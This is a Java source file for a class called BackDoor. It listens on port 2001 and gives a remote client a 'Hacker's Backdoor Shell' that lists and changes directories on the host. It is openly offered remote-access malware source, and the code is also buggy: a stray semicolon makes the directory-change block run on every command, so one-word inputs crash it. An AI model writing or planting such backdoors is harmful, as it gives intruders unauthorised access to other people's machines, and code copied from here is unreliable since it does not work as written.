import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOError;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;

public class BackDoor {

	public static void main(String[] args) throws IOException {
		// TODO Auto-generated method stub

		//try {
			ServerSocket server=new ServerSocket(2001);
			Socket client=server.accept();
			String workingDir=System.getProperty("user.dir");
			String prompt=System.getProperty("os.name").toLowerCase().contains("mac os")?" % ":" :> ";
			System.out.println();
			
			InputStream in=client.getInputStream();
			OutputStream out=client.getOutputStream();
			
			BufferedReader reader=new BufferedReader(new InputStreamReader(in));
			BufferedWriter writer=new BufferedWriter(new OutputStreamWriter(out));
		
			writer.write("\nWelcome to Hacker's Backdoor Shell\n\n");
			
			while(true) {
				
				writer.write("\n\r"+workingDir+prompt);
				writer.flush();
				String clientCommand=reader.readLine();
				
				if(clientCommand.equalsIgnoreCase("cd .")) {
					writer.write("\nWorking directory is: "+workingDir+"\n\n");
				}
				
				else if(clientCommand.equalsIgnoreCase("dir")){
					//writer.write("\nShould list files in the current directory \n\n");
					File currentDirectory=new File(workingDir);
					File[] allFiles=currentDirectory.listFiles();
					
					for(File f:allFiles) {
						writer.write("\n\r"+f.getName()+(f.isDirectory()?"- Directory":"- file"));
					}
				}
					else if(clientCommand.startsWith("cd"));{
						String d =clientCommand.split(" ")[1];
						File work;
						
						if(d.equalsIgnoreCase("..")) {
							work=new File(workingDir).getParentFile();
						}else {
							work=new File(workingDir+File.separator+d);
						}
						
						String temp=workingDir+File.separator+d;
						if(new File(temp).isDirectory()) {
							workingDir=temp;
						}
						else {
							writer.write("\n Directory doesn't exist");
						}
					}
				}
		
		}
		
			
}
